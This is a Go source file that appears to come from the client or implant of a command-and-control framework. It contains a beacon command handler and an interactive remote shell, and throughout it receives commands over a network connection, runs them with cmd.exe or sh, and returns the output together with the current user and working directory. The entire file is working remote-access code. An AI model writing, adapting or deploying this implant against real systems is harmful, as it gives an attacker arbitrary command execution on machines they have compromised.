package commands

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"src/Client/generic/logger"
	"src/Client/session/protocol"
	"strings"
	"time"
)

func BeaconShellCommand(command string) (string, error) {
	logger.Log(fmt.Sprintf("Executing beacon shell command: %s", command))

	var commandStr string

	// Support both JSON objects with a "command" field and raw/JSON string payloads like "pwd".
	raw := strings.TrimSpace(command)
	if raw == "" {
		logger.Error("Received empty command string.")
		return "", fmt.Errorf("error: received empty command string")
	}

	if json.Valid([]byte(raw)) {
		var any interface{}
		if err := json.Unmarshal([]byte(raw), &any); err == nil {
			switch v := any.(type) {
			case map[string]interface{}:
				if val, ok := v["command"]; ok {
					if s, ok := val.(string); ok && strings.TrimSpace(s) != "" {
						commandStr = s
					} else {
						logger.Error("Received empty or invalid 'command' value in JSON object.")
						return "", fmt.Errorf("error: received empty or invalid 'command' value in JSON object")
					}
				} else {
					logger.Error("JSON does not contain 'command' key.")
					return "", fmt.Errorf("error: JSON does not contain 'command' key")
				}
			case string:
				// JSON string payload, e.g., "pwd"
				commandStr = v
			default:
				// Unsupported JSON type; fall back to trimming quotes
				commandStr = strings.Trim(raw, "\"")
			}
		} else {
			// Shouldn't happen if json.Valid returned true, but be resilient.
			logger.Log("JSON valid but unmarshal failed; treating as plain string.")
			commandStr = strings.Trim(raw, "\"")
		}
	} else {
		// Not JSON; treat as plain string
		commandStr = strings.Trim(raw, "\"")
	}

	logger.Log(fmt.Sprintf("Command to execute: %s", commandStr))

	output, err := RunShellCommand(commandStr)
	if err != nil {
		logger.Error(fmt.Sprintf("Command execution failed: %v", err))
		return "", fmt.Errorf("error executing command: %w", err)
	}
	logger.Log(fmt.Sprintf("Command output: %s", output))
	return output, nil
}

func RunShellCommand(commandStr string) (string, error) {

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel() // Ensure the context is cancelled to release resources.

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// Use the native Windows shell
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", commandStr)
	} else {
		// POSIX shells
		cmd = exec.CommandContext(ctx, "sh", "-c", commandStr)
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start command: %w", err)
	}

	err := cmd.Wait()

	output := strings.TrimSpace(stdout.String())
	errorOutput := strings.TrimSpace(stderr.String())

	combinedOutput := output
	if errorOutput != "" {
		if combinedOutput != "" {
			combinedOutput += "\n"
		}
		combinedOutput += "Stderr: " + errorOutput
	}

	if ctx.Err() == context.DeadlineExceeded {
		return combinedOutput, fmt.Errorf("command timed out after 30 seconds")
	}

	if err != nil {
		return combinedOutput, fmt.Errorf("command execution failed: %w", err)
	}

	return combinedOutput, nil
}

func ShellHandler(conn net.Conn) {
	currentInfo, err := os.Getwd()
	if err != nil {
		fmt.Fprintf(conn, "Error getting current directory: %v\n", err)
		protocol.SendData(conn, []byte("Error getting current directory."))
		return
	}
	userInfo, err := user.Current()
	if err != nil {
		fmt.Fprintf(conn, "Error getting user information: %v\n", err)
		protocol.SendData(conn, []byte("Error getting user information."))
		return
	}
	info := userInfo.Username + "<sep>" + currentInfo
	logger.Log(fmt.Sprintf("Current user: %s, Current directory: %s", userInfo.Username, currentInfo))
	protocol.SendData(conn, []byte(info))
	for {
		command, err := protocol.ReceiveData(conn)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to receive command: %v", err))
			return
		}
		commandStr := string(command)
		logger.Log(fmt.Sprintf("Received command: %s", commandStr))

		if commandStr == "exit" {
			logger.Log("Exiting shell handler.")
			break
		}
		if strings.HasPrefix(commandStr, "cd") {
			parts := strings.Fields(commandStr)
			var targetDir string
			if len(parts) < 2 {
				currentUser, err := user.Current()
				if err != nil {
					logger.Error(fmt.Sprintf("Failed to get current user: %v", err))
					protocol.SendData(conn, []byte(fmt.Sprintf("Error getting user info: %v", err)))
					continue
				}
				targetDir = currentUser.HomeDir
			} else {
				targetDir = parts[1]
			}
			err := os.Chdir(targetDir)
			if err != nil {
				logger.Error(fmt.Sprintf("Failed to change directory: %v", err))
				protocol.SendData(conn, []byte(fmt.Sprintf("Error changing directory: %v<sep>%s", err, currentInfo)))
				continue
			}
			currentInfo, err = os.Getwd()
			if err != nil {
				logger.Error(fmt.Sprintf("Error getting current directory after cd: %v", err))
				protocol.SendData(conn, []byte(fmt.Sprintf("Error getting current directory after cd: %v<sep>%s", err, currentInfo)))
				continue
			}
			logger.Log(fmt.Sprintf("Changed directory to: %s", currentInfo))
			protocol.SendData(conn, []byte(fmt.Sprintf("Changed directory to: %s<sep>%s", currentInfo, currentInfo)))
			continue
		}

		output, err := RunShellCommand(commandStr)
		if err != nil {
			logger.Error(fmt.Sprintf("Command execution failed: %v", err))
			protocol.SendData(conn, []byte(fmt.Sprintf("Error executing command: %v", err)))
			continue
		}
		currentInfo, err := os.Getwd()
		if err != nil {
			logger.Error(fmt.Sprintf("Error getting current directory: %v", err))
			protocol.SendData(conn, []byte("Error getting current directory."))
			continue
		}
		output += "<sep>" + currentInfo
		protocol.SendData(conn, []byte(output))
	}
	logger.Log("Shell handler finished.")
}
